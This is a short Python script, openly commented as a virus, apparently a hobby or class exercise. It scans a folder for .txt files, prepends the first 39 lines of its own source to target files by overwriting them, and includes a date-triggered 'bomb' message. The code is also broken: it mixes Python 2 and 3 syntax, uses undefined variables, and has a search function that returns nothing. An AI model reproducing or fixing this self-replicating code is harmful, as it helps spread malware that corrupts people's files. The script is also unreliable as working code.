#!/usr/bin/python
import os
import datetime
print(datetime.datetime.now())
print("applied business technology")

def search(path):       
    filestoinfect=[] #the virus generates a list of files to be infected
    infectedfiles=[] #the virus generates a list of files that have been infected
    for file in os.listdir(path): #virus scans files in a folder with this "for" loop
        if file.endswith(".txt"): #virus searches for certain file type
            m = open(file, "r") #opens the file to read lines
            x = m.readlines() #reads information line by line
#print(m) #check the read file
#print(x) #check the read lines
            for x in m:
                if str("applied business technology") in x: 
                    infectedfiles.append(file)
                    filestoinfect.remove(file)
            m.close()
    #print(os.path.join(path, file))
print(filestoinfect)
print(infectedfiles)
search("C:\\Users\\Chase Darlington\\Downloads")
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 10:
        print "VIRUS INFECTED!"
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()
